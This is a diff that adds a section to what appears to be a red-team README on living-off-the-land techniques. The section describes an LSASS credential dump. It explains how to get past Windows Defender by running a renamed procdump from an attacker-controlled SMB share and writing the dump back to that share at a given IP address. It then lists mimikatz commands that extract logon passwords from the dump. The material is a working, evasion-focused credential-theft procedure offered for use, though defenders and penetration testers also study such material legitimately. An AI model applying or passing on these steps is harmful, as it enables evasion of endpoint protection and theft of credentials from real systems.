@@ -109,3 +109,17 @@ Its as simple as pointing to a remote share which then loads python into memory.
 ![image](https://user-images.githubusercontent.com/130473605/235464000-614a31d4-8847-413f-8a21-15826483bbbf.png)
 
 ## <a name="LSASS-Dump"></a>LSASS Dump
+
+It is possible to bypass Defender and dump the lsass file to a remote share. Once privilege escalation is successful and you can spawn a system shell, it is possible to run procdump.exe from an attacker controlled share and point the dump file to the same attacker controlled SMB share. You can then to use a tool like mimikatz to extract the credentials from the lsass dump.
+
+![image](https://github.com/deeexcee-io/LOI-Bins/assets/130473605/3d461c9b-d38a-482d-85f3-f9d09364e12a)
+
+As shown above procdump64.exe was called from the host and an lsass (process id 1020) dump initiated from the host machine and then an attempted save to a remote share was executed. This was blocked.
+
+However, by pointing to a renamed procdump64.exe on a remote share and then initiating a dump back to the same share is successful - \\192.168.59.134\shellz\dumpert123.dmp
+
+This can then be analyzed with Mimikatz to extract credentials.
+mimikatz.exe “sekurlsa::minidump C:\shellz\dumpert123.dmp”
+sekurlsa::logonpasswords
+
+![image](https://github.com/deeexcee-io/LOI-Bins/assets/130473605/2ee687d8-1b96-47f9-ba66-896c5e3443d0)
